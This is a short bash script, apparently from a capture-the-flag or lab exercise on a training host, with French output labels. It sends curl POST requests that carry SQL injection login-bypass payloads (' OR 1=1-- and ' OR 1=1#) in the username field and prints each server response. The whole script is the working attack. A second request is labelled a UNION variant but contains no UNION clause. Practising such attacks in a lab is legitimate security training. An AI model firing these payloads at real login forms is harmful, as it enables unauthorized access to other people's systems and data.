#!/bin/bash
B="http://chatelaine.cylabacademy.net:25024"
echo "=== corps complet de la reponse ==="
curl -s -m 20 --data-urlencode "username=' OR 1=1-- " --data-urlencode "password=x" "$B/" | tail -20
echo
echo "=== variante UNION ==="
curl -s -m 20 --data-urlencode "username=' OR 1=1#" --data-urlencode "password=x" "$B/" | tail -15
